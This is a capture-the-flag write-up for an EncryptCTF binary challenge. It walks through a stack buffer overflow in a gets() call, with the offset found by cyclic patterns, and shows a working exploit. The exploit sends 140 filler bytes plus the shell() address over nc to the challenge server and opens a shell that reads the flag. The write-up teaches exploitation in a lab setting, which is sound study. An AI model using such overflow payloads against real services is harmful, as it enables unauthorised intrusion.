## PWN 1
### Category : Pwning/Binary Exploitaition

As usual we are given a binary to exploit.

Let's decompile it in Ghidra

```
undefined4 main(void)

{
  char local_90 [140];
  
  setvbuf(stdout,(char *)0x0,2,0);
  printf("Tell me your name: ");
  gets(local_90);
  printf("Hello, %s\n",local_90);
  return 0;
}
```

A simple buffer overflow. 

Let's checksec it

```
checksec pwn1 
[*] '/home/vipul/Desktop/EncryptCTF/pwn1_SOLVED/pwn1'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

SInce NX is enabled, we can't inject shellcode. But we don't have to. We are given a function that calls the shell for us

```
void shell(void)

{
  system("/bin/bash");
  return;
}
```
2 Steps of Buffer Overflow

1) Find the Offset to overflow
2) Find the location of the function to call

For step 1

Using pwntools cyclic(n) function we get break it, and then using cyclic_find(n) we get the offset.

```
Reading symbols from ./pwn1...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/vipul/Desktop/EncryptCTF/pwn1_SOLVED/pwn1 
Tell me your name: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Hello, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

Program received signal SIGSEGV, Segmentation fault.


[----------------------------------registers-----------------------------------]
EAX: 0x0 
EBX: 0x0 
ECX: 0xffffffff 
EDX: 0xf7fac890 --> 0x0 
ESI: 0xf7fab000 --> 0x1dcd6c 
EDI: 0xf7fab000 --> 0x1dcd6c 
EBP: 0x6261616a ('jaab')
ESP: 0xffffd480 ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
EIP: 0x6261616b ('kaab')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x6261616b
[------------------------------------stack-------------------------------------]
0000| 0xffffd480 ("laabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0004| 0xffffd484 ("maabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0008| 0xffffd488 ("naaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0012| 0xffffd48c ("oaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0016| 0xffffd490 ("paabqaabraabsaabtaabuaabvaabwaabxaabyaab")
0020| 0xffffd494 ("qaabraabsaabtaabuaabvaabwaabxaabyaab")
0024| 0xffffd498 ("raabsaabtaabuaabvaabwaabxaabyaab")
0028| 0xffffd49c ("saabtaabuaabvaabwaabxaabyaab")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x6261616b in ?? ()
```

```
>>> from pwn import *
>>> cyclic(200)
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab'
>>> cyclic_find(0x6261616b)
140
```
We have the offset 140. For the shell function
```
gdb-peda$ info address shell
Symbol "shell" is at 0x80484ad in a file compiled without debugging.
```
The exploit 
```
vipul@ubuntu:~$ python -c "from pwn import *; print('A'*140 +p32(0x80484ad))" > exploit
vipul@ubuntu:~$ cat exploit - | nc 104.154.106.182 2345
Tell me your name: Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��
whoami
pwn1
ls
flag.txt
pwn1
cat flag.txt
encryptCTF{Buff3R_0v3rfl0W5_4r3_345Y}
```